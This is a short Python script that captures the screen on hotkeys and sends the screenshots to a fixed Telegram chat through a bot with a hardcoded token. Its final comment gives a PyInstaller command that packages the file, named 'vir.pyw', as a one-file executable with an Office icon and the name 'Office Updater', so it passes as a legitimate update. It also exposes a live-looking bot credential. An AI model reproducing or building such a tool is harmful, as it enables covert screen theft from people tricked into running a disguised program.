# -*- coding: utf-8 -*-
from pyautogui import screenshot
from keyboard import add_hotkey, wait
from telebot import TeleBot
from playsound import playsound
from time import sleep
IMG_PATH = './cur.png'
CLIENT_ID = 1757578241

TOKEN = '1122107177:AAHMbI5jnNQFrOCrG6Cwbx_7nJk-9pSOVC4'

bot = TeleBot(TOKEN)
status = False


def send_screen():
    global status
    global bot
    if status:
        my_screen = screenshot()
        my_screen.save(IMG_PATH)
        with open(IMG_PATH, 'rb') as photo:
            for _ in range(5):
                try:
                    bot.send_document(CLIENT_ID, photo)
                    playsound('click.wav')
                    print('Good Job =)')
                    break
                except Exception as E:
                    bot = TeleBot(TOKEN)
                    print(E)
                    sleep(2)
                    continue


def activation():
    global status
    status = not status
    if status:
        playsound('on.wav')
    else:
        playsound('off.wav')

add_hotkey('ctrl+shift+z', activation)
add_hotkey('alt+shift', send_screen)

print('Program is OK now =)')
playsound('click.wav')
wait()

# pyinstaller --onefile vir.pyw -i office.ico -n "Office Updater"
